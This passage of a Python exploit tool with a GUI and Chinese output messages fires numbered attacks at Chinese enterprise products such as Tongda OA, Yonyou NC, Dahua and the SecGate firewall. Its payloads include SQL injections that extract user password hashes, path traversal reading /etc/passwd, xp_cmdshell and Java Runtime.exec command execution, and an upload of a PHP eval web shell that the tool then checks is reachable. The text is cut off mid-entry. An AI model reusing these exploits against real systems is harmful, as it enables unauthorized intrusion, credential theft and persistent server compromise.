                        path = "CommonFileServer/c%3A%2Fwindows%2Fwin.ini"
                    else:
                        path = "/CommonFileServer/c%3A%2Fwindows%2Fwin.ini"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在金蝶云星空任意文件读取漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在金蝶云星空任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "50.通达OA SQL注入漏洞(CVE-2023-4165)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
                    }
                    if url.endswith("/"):
                        path = "general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
                    else:
                        path = "/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            if '重新登录' in res or 'Burp Suite Professional' in res:
                                self.append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4165)", "green")
                            else:
                                self.append_to_output(f"[+] {url} 存在通达OA SQL注入漏洞(CVE-2023-4165)！！！！", "red")
                                self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4165)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "51.通达OA SQL注入漏洞(CVE-2023-4166)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
                    }
                    if url.endswith("/"):
                        path = "general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),2,1))=char(68) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1"
                    else:
                        path = "/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and (substr(DATABASE(),2,1))=char(68) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            if '重新登录' in res or 'Burp Suite Professional' in res:
                                self.append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4166)", "green")
                            else:
                                self.append_to_output(f"[+] {url} 存在通达OA SQL注入漏洞(CVE-2023-4166)！！！！", "red")
                                self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在通达OA SQL注入漏洞(CVE-2023-4166)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "52.绿盟sas安全审计系统任意文件读取漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                    }
                    if url.endswith("/"):
                        path = "webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
                    else:
                        path = "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.get(encodetext, headers=headers, timeout=5, verify=False, proxies=proxies)
                        res = req.text

                        if req.status_code == 200:
                            if 'Your ip cannot access web service' in res or 'service is unavailable in the current state' in res:
                                self.append_to_output(f"[-] {url} 不存在绿盟sas安全审计系统任意文件读取漏洞", "green")
                            else:
                                self.append_to_output(f"[+] {url} 存在绿盟sas安全审计系统任意文件读取漏洞！！！！", "red")
                                self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在绿盟sas安全审计系统任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "53.网神 SecGate 3600 防火墙任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "?g=obj_app_upfile"
                    else:
                        path = "/?g=obj_app_upfile"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Connection": "keep-alive",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
                    }

                    data = '''------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="upfile"; filename="1.php"\r\nContent-Type: text/plain\r\n\r\n<?php\r\neval($_POST["pass"]);\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 可能存在网神 SecGate 3600 防火墙任意文件上传漏洞！！！！", "yellow")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output("发送请求包进行漏洞确认","green")
                            if url.endswith("/"):
                                path = "attachements/1.php"
                            else:
                                path = "/attachements/1.php"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            else:
                                url_new = url
                            end_newpath = url_new + path
                            try:
                                newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                                newres = newreq.text
                                if newreq.status_code == 200:
                                    self.append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                                    self.append_to_output(f"[+] 返回数据为: {newres} ", "red")
                                    with open("output.txt", "a") as file:
                                        file.write(f"[+] {url} 存在网神 SecGate 3600 防火墙任意文件上传漏洞！！！！" + "\n")
                                        file.write(res + "\n")
                                else:
                                    self.append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 寻找1.php文件请求超时，跳过URL: {end_newpath}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在网神 SecGate 3600 防火墙任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "54.大华智慧园区综合管理平台SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
                    }
                    if url.endswith("/"):
                        path = "portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D"
                    else:
                        path = "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text

                        if 'XPATH' in res:
                            self.append_to_output(f"[+] {url} 存在大华智慧园区综合管理平台SQL注入漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在大华智慧园区综合管理平台SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "55.金和OA C6-GetSqlData.aspx SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "?g=obj_app_upfile"
                    else:
                        path = "/?g=obj_app_upfile"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Connection": "keep-alive",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9",
                    }

                    data = '''exec master..xp_cmdshell 'ipconfig' '''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 可能存在金和OA C6-GetSqlData.aspx SQL注入漏洞！！！！", "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在金和OA C6-GetSqlData.aspx SQL注入漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在金和OA C6-GetSqlData.aspx SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "56.用友-NC-Cloud远程代码执行漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "0811.jsp?error=bsh.Interpreter"
                    else:
                        path = "/0811.jsp?error=bsh.Interpreter"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests":"1",
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server",
                        "If-Modified-Since":"Mon, 11 May 2020 15:41:36 GMT",
                        "Connection": "close",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }

                    data = '''cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ifconfig").getInputStream())'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'Burp Suite Professional' not in res:
                            self.append_to_output(f"[+] {url} 存在用友-NC-Cloud远程代码执行漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在用友-NC-Cloud远程代码执行漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友-NC-Cloud远程代码执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "57.广联达 Linkworks办公OA SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
                    else:
                        path = "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests":"1",
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Connection": "close",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }

                    data = '''key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and ':' in res:
                            self.append_to_output(f"[+] {url} 存在广联达 Linkworks办公OA SQL注入漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在广联达 Linkworks办公OA SQL注入漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在广联达 Linkworks办公OA SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "58.企业微信0daysecret漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
                    }
                    if url.endswith("/"):
                        path = "cgi-bin/gateway/agentinfo"
                    else:
                        path = "/cgi-bin/gateway/agentinfo"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                        res = req.text

                        if 'Secret' in res:
                            self.append_to_output(f"[+] {url} 存在企业微信0daysecret漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在企业微信0daysecret漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "59.用友时空KSOA SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Accept-Language": "en",
                        "Accept-Encoding": "gzip,deflate",
                        "Cookie": "PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb"
                    }
                    if url.endswith("/"):
                        path = "servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:10%27--"
                    else:
                        path = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:10%27--"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        expected_time = 10  # 期望的回包时间，单位为秒
                        start_time = time.time()
                        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
                        res = req.text
                        end_time = time.time()

                        response_time = end_time - start_time
                        if response_time >= expected_time:
                            self.append_to_output(f"[+] {url} 存在用友时空KSOA SQL注入漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友时空KSOA SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "60.任我行CRM系统 SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "SMS/SmsDataList/?pageIndex=1&pageSize=30"
                    else:
                        path = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests":"1",
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Connection": "close",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }

                    data = '''Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'adc3949ba59abbe56e057f20f883e' in res:
                            self.append_to_output(f"[+] {url} 存在任我行CRM系统 SQL注入漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在任我行CRM系统 SQL注入漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在任我行CRM系统 SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "61.用友移动管理系统 任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "maportal/appmanager/uploadApk.do?pk_obj="
                    else:
                        path = "/maportal/appmanager/uploadApk.do?pk_obj="

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",
                    }

                    data = '''------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\nContent-Disposition: form-data; name="downloadpath"; filename="a.jsp"\r\nContent-Type: application/msword\r\n\r\nhelloworld\r\n------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and '2' in res:
                            self.append_to_output(f"[+] {url} 99%存在用友移动管理系统 任意文件上传漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            self.append_to_output("发送请求包进行漏洞确认", "green")
                            if url.endswith("/"):
                                path = "maupload/apk/a.jsp"
                            else:
                                path = "/maupload/apk/a.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            else:
                                url_new = url
                            end_newpath = url_new + path
                            try:
                                newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                                newres = newreq.text
                                if newreq.status_code == 200 and 'helloworld' in newres:
                                    self.append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                                    self.append_to_output(f"[+] 返回数据为: {newres} ", "red")
                                    with open("output.txt", "a") as file:
                                        file.write(f"[+] {url} 存在用友移动管理系统 任意文件上传漏洞！！！！" + "\n")
                                        file.write(res + "\n")
                                else:
                                    self.append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 寻找a.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在用友移动管理系统 任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "62.亿赛通电子文档安全管理系统任意文件上传漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"
                    else:
                        path = "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Connection": "close",
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",
                    }

                    data = '''test666'''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and '2' in res:
                            self.append_to_output(f"[+] {url} 99%存在亿赛通电子文档安全管理系统任意文件上传漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            self.append_to_output(f"[+] 返回数据为: {res} ", "red")
                            self.append_to_output("发送请求包进行漏洞确认", "green")
                            if url.endswith("/"):
                                path = "tttT.jsp"
                            else:
                                path = "/tttT.jsp"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url = 'http://' + url
                            else:
                                url_new = url
                            end_newpath = url_new + path
                            try:
                                newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                                newres = newreq.text
                                if newreq.status_code == 200 and 'test666' in newres:
                                    self.append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                                    self.append_to_output(f"[+] 返回数据为: {newres} ", "red")
                                    with open("output.txt", "a") as file:
                                        file.write(f"[+] {url} 存在亿赛通电子文档安全管理系统任意文件上传漏洞！！！！" + "\n")
                                        file.write(res + "\n")
                                else:
                                    self.append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                            except Timeout:
                                self.append_to_output(f"[!] 寻找tttT.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                            except Exception as e:
                                self.append_to_output(str(e), "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在亿赛通电子文档安全管理系统任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e), "yellow")
                if vulnerability == "63.企望制造ERP系统 RCE漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "mainFunctions/comboxstore.action"
                    else:
                        path = "/mainFunctions/comboxstore.action"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url_new = 'http://' + url
                    else:
                        url_new = url
                    encodetext = url_new + path
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                    }

                    data = '''comboxsql=exec%20xp_cmdshell%20'whoami' '''
                    self.append_to_output("===================================================================","green")
                    try:
                        #requests.packages.urllib3.disable_warnings()
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'data' in res and '{"Item":' in res:
                            self.append_to_output(f"[+] {url} 存在企望制造ERP系统 RCE漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
